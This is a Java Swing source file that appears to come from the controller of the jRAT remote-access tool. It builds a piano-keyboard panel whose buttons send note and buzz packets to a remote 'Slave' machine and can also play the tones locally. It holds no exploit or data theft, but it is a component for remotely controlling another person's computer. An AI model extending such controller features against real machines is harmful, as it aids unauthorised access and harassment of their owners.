package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.controller.ErrorDialog;
import io.jrat.controller.Piano;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet66PianoNote;
import io.jrat.controller.packets.outgoing.Packet67LongPianoNote;

import java.awt.Button;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSpinner;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SpinnerNumberModel;


@SuppressWarnings("serial")
public class PanelControlPiano extends PanelControlParent {
	private JCheckBox chckbxActivateBuzz;
	private JSpinner spinnerSec;
	private JSpinner spinnerSound;
	private JCheckBox chckbxPlaySoundHere;

	public PanelControlPiano(Slave sl) {
		super(sl);
		setLayout(null);

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Keyboard"));
		panel.setBounds(10, 105, 439, 219);
		add(panel);
		panel.setLayout(null);

		Button button_8 = new Button("");
		button_8.setBackground(Color.BLACK);
		button_8.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(1);
			}
		});
		button_8.setBounds(41, 26, 25, 107);
		panel.add(button_8);

		Button button_9 = new Button("");
		button_9.setBackground(Color.BLACK);
		button_9.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(3);
			}
		});
		button_9.setBounds(76, 26, 25, 107);
		panel.add(button_9);

		Button button_10 = new Button("");
		button_10.setBackground(Color.BLACK);
		button_10.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(6);
			}
		});
		button_10.setBounds(143, 26, 25, 107);
		panel.add(button_10);

		Button button_11 = new Button("");
		button_11.setBackground(Color.BLACK);
		button_11.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(10);
			}
		});
		button_11.setBounds(178, 26, 25, 107);
		panel.add(button_11);

		Button button_12 = new Button("");
		button_12.setBackground(Color.BLACK);
		button_12.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(14);
			}
		});
		button_12.setBounds(264, 26, 25, 107);
		panel.add(button_12);

		Button button_13 = new Button("");
		button_13.setBackground(Color.BLACK);
		button_13.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(11);
			}
		});
		button_13.setBounds(209, 26, 25, 107);
		panel.add(button_13);

		JButton button = new JButton("");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(-1);
			}
		});
		button.setBounds(20, 26, 33, 155);
		panel.add(button);

		JButton button_1 = new JButton("");
		button_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(2);
			}
		});
		button_1.setBounds(53, 26, 34, 155);
		panel.add(button_1);

		JButton button_2 = new JButton("");
		button_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(4);
			}
		});
		button_2.setBounds(88, 26, 33, 155);
		panel.add(button_2);

		JButton button_3 = new JButton("");
		button_3.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(5);
			}
		});
		button_3.setBounds(121, 26, 34, 155);
		panel.add(button_3);

		JButton button_4 = new JButton("");
		button_4.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(9);
			}
		});
		button_4.setBounds(189, 26, 33, 155);
		panel.add(button_4);

		JButton button_5 = new JButton("");
		button_5.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(8);
			}
		});
		button_5.setBounds(156, 26, 33, 155);
		panel.add(button_5);

		JButton button_6 = new JButton("");
		button_6.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(12);
			}
		});
		button_6.setBounds(223, 26, 33, 155);
		panel.add(button_6);

		JButton button_7 = new JButton("");
		button_7.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				play(13);
			}
		});
		button_7.setBounds(256, 26, 33, 155);
		panel.add(button_7);

		chckbxActivateBuzz = new JCheckBox("Activate buzz");
		chckbxActivateBuzz.setSelected(true);
		chckbxActivateBuzz.setBounds(20, 188, 97, 23);
		panel.add(chckbxActivateBuzz);

		chckbxPlaySoundHere = new JCheckBox("Play sound here");
		chckbxPlaySoundHere.setBounds(125, 188, 111, 23);
		panel.add(chckbxPlaySoundHere);

		JPanel panel_1 = new JPanel();
		panel_1.setBorder(BorderFactory.createTitledBorder("Play custom sound"));
		panel_1.setBounds(10, 11, 439, 83);
		add(panel_1);

		JLabel lblSound = new JLabel("Sound:");

		spinnerSound = new JSpinner();
		spinnerSound.setModel(new SpinnerNumberModel(1, 0, 13, 1));

		JLabel lblSeconds = new JLabel("Seconds");

		spinnerSec = new JSpinner();
		spinnerSec.setModel(new SpinnerNumberModel(1, 1, 60, 1));

		JButton btnSend = new JButton("Send");
		btnSend.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				slave.addToSendQueue(new Packet67LongPianoNote((Integer) spinnerSound.getValue(), (Integer) spinnerSec.getValue()));
			}
		});
		btnSend.setIcon(IconUtils.getIcon("arrow-right"));

		JButton btnTest = new JButton("Test");
		btnTest.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					AudioFormat af = new AudioFormat(Piano.SAMPLE_RATE, 8, 1, true, true);
					SourceDataLine dl = AudioSystem.getSourceDataLine(af);
					dl.open(af, Piano.SAMPLE_RATE);
					dl.start();
					Piano.play(dl, Piano.values()[(Integer) spinnerSound.getValue()], (Integer) spinnerSec.getValue() * 1000);
					dl.drain();
					dl.close();
				} catch (Exception ex) {
					ErrorDialog.create(ex);
				}
			}
		});
		btnTest.setIcon(IconUtils.getIcon("sound"));
		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
		gl_panel_1.setHorizontalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addComponent(lblSound).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinnerSound, GroupLayout.PREFERRED_SIZE, 61, GroupLayout.PREFERRED_SIZE).addGap(18).addComponent(lblSeconds).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinnerSec, GroupLayout.PREFERRED_SIZE, 68, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 22, Short.MAX_VALUE).addComponent(btnTest).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend).addContainerGap()));
		gl_panel_1.setVerticalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(lblSound).addComponent(spinnerSound, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblSeconds).addComponent(spinnerSec, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addContainerGap(29, Short.MAX_VALUE)).addGroup(Alignment.TRAILING, gl_panel_1.createSequentialGroup().addContainerGap(26, Short.MAX_VALUE).addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(btnSend).addComponent(btnTest)).addContainerGap()));
		panel_1.setLayout(gl_panel_1);
	}

	public void play(int i) {
		while (i <= 0) {
			i++;
		}
		while (i > 13) {
			i--;
		}
		if (chckbxPlaySoundHere.isSelected()) {
			try {
				AudioFormat af = new AudioFormat(Piano.SAMPLE_RATE, 8, 1, true, true);
				SourceDataLine dl = AudioSystem.getSourceDataLine(af);
				dl.open(af, Piano.SAMPLE_RATE);
				dl.start();
				Piano.play(dl, Piano.values()[i], 500);
				dl.drain();
				dl.close();
			} catch (Exception ex) {
				ErrorDialog.create(ex);
			}
		}

		slave.addToSendQueue(new Packet66PianoNote(i, chckbxActivateBuzz.isSelected()));
	}
}
